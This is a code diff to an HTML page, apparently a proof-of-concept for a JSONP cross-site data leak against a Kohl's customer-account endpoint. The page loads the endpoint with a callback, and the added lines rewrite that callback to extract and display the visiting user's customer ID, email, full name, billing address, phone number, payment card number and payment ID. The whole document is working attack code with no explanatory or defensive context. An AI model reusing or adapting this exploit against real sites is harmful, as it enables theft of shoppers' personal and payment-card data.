@@ -2,7 +2,15 @@
 
 <script type="text/javascript">
 function myCallback(data) {
-    document.getElementById('div1').innerHTML=JSON.stringify(data);
+    document.getElementById('data1').innerHTML='CustomerID: '+Object.values(data.payload.profile.id);
+document.getElementById('data1').innerHTML=document.getElementById('data1').innerHTML+'<br>'+'Customer Email: '+Object.values(data.payload.profile.email);
+document.getElementById('data1').innerHTML=document.getElementById('data1').innerHTML+'<br>'+'Customer firstname: '+Object.values(data.payload.profile.customerName.firstName);
+document.getElementById('data1').innerHTML=document.getElementById('data1').innerHTML+'<br>'+'Customer lastname: '+Object.values(data.payload.profile.customerName.lastName);
+document.getElementById('data1').innerHTML=document.getElementById('data1').innerHTML+'<br>'+'Customer Billing Addres: '+Object.values(data.payload.profile.billAddress);
+document.getElementById('data1').innerHTML=document.getElementById('data1').innerHTML+'<br>'+'Customer Phone Number: '+Object.values(data.payload.profile.billAddress.phoneNumber);
+document.getElementById('data1').innerHTML=document.getElementById('data1').innerHTML+'<br>'+'Customer Card Info: '+Object.values(data.payload.profile.paymentTypes[0].cardNum);
+document.getElementById('data1').innerHTML=document.getElementById('data1').innerHTML+'<br>'+'Customer Card Info: '+Object.values(data.payload.profile.paymentTypes[0].ID);
+
 </script>
 <script src='https://www.kohls.com/myaccount/json/myinfo/customer_saleAlerts_details_json.jsp?callback=myCallback'></script>
 
